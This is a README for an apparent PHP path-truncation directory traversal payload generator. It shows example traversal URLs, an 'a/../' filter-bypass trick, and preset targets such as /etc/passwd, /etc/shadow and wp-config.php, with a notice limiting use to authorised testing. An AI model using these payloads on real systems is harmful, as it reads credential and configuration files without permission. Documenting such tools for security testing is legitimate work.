# Directory Traversal Path Truncation Payload Generator

A Python tool for generating directory traversal payloads with Path Truncation.

## Features

- **Interactive Mode**: Step-by-step payload generation
- **Batch Mode**: Generate multiple payloads at once
- **Advanced Bypass**: Automatic `a/` prefix technique integration
- **Pre-configured Targets**: Common files and paths included
- **Export Options**: Save payloads to files
- **Clean Output**: Professional formatting and previews

## Usage

### Interactive Mode
```bash
python3 truncphp.py
# Select option 1 for interactive mode
```

### Example Output
```
Base URL: http://target.com/page.php?page=
Target file: admin.html
Path: current
Repetitions: 2500

Generated URL:
http://target.com/page.php?page=a/../admin.html/././././...
```

### Batch Mode
Generates payloads for common targets:
- `index.php`, `config.php`, `admin.html`
- System files: `/etc/passwd`, `/etc/shadow`
- WordPress: `wp-config.php`
- And more

## Bypass Technique

The tool automatically applies the `a/../` technique to all payloads:

```
Normal payload:     ../../../etc/passwd
With bypass:        a/../../../etc/passwd
```

This technique helps bypass basic filters that look for direct `../` patterns.

## Pre-configured Targets

| Target | Path | Description |
|--------|------|-------------|
| `admin.html` | `a/../` | Admin panel |
| `config.php` | `a/../` | Configuration |
| `passwd` | `a/../../../etc/` | System users |
| `wp-config.php` | `a/../../` | WordPress config |

## Requirements

- Python 3.6+
- No external dependencies

## Legal Notice

This tool is for educational and authorized security testing purposes only. Users are responsible for ensuring they have proper authorization before testing any systems.

